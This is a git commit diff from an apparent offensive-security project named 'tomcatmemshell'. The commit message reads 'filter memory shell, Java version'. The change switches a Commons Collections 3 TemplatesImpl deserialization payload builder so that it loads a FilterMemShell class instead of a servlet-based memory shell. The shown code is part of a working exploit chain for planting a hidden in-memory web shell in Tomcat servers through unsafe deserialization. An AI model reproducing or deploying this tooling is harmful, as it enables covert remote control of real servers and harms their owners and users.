7a3b6bcc224e08beb9d43c313e770b8a20de25df
godown <1958304602@qq.com>
2025-03-04 16:57:51 +0800

    filter内存马 java版

--- src/main/java/org/example/tomcatmemshell/servlet/CC3TemplatesImpl.java
+++ src/main/java/org/example/tomcatmemshell/servlet/CC3TemplatesImpl.java
@@ -21,7 +21,8 @@ import java.util.Map;
 //CC3.2.1
 public class CC3TemplatesImpl {
     public static void main(String[] args) throws Exception {
-        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/servlet/GenericTomcatMemShell3.class"));
+//        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/servlet/GenericTomcatMemShell3.class"));
+        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Filter/FilterMemShell.class"));
         TemplatesImpl templatesClass = new TemplatesImpl();
         Field[] fields = templatesClass.getClass().getDeclaredFields();
         for (Field field : fields) {
